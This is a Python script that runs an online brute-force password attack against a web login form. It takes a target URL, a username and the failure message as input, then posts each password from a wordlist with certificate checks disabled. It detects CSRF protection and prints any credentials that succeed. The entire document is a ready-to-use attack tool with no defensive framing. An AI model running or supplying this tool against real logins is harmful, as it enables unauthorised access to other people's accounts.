import urllib3
urllib3.disable_warnings()

import requests
import time
import sys

class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        
        

    def crack(self, passwords):
        count = 0
        for password in passwords:
            password = password.strip()
            count += 1
            password_found = False  # Initialize flag
            print(f"Trying Password: {count} Time For => {password}")
            data_dict = {"command": "login", "username": self.username, "password": password, "domain": "%2F", "response": "json"}
            try:
                response = requests.post(self.url, data=data_dict, verify=False)
                response.raise_for_status()
                #print(response.text)
                time.sleep(3)
            except requests.exceptions.RequestException as e:
                print(f"An error occurred: {e}")
                return
            
            if self.error_message in response.text:
                pass
            elif "CSRF" in response.text or "csrf" in response.text:
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                return
            else:
                print("Username: ---> " + self.username)
                print("Password: ---> " + password)
                password_found = True  # Initialize flag
        print("[!!] password not in list")
def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    cracker = BruteForceCracker(url, username, error)

    try:
        with open("password.txt", "r") as passwords:
            cracker.crack(passwords)
    except IOError:
        print("Some Error Occurred Please Check Your Internet Connection !!")

if __name__ == '__main__':
    main()
